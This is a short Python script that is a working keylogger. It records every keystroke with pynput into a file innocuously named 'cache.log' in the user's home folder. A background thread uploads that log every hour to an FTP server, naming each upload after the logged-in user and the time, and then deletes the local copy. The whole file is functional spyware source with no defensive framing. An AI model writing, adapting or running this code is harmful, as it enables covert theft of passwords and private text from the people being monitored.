from pynput.keyboard import Listener
import os
import ftplib
import time
import threading
import datetime
import getpass


def log_keypress(key):
    # saves the acquired key press to a log file
    with open(filename, 'a') as f:
        # in case a non character key is pressed
        try:
            f.write(key.char)
        except AttributeError:
            f.write(' <' + str(key) + '> ')


def upload_log():
    # creates infinite loop
    while True:
        # uploads logs every hour
        time.sleep(3600)

        # connects to the ftp server
        session = ftplib.FTP(host='', user='', passwd='')

        # gets current user/time to use as the name
        name = getpass.getuser()
        date = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        # reads the file and uploads it to the ftp server
        session.storbinary('STOR ' + name + ' ' + date, open(filename, 'rb'))
        session.quit()

        # deletes the file once uploaded
        time.sleep(1)
        os.remove(filename)


if __name__ == '__main__':
    # creates a path for the file
    filename = os.path.join(os.path.expanduser("~"), 'cache.log')
    # create separate thread that uploads the logged keys to an FTP
    threading.Thread(target=upload_log).start()
    # listens for key input, when a key is pressed the log key function is called
    with Listener(on_press=log_keypress) as listener:
        listener.join()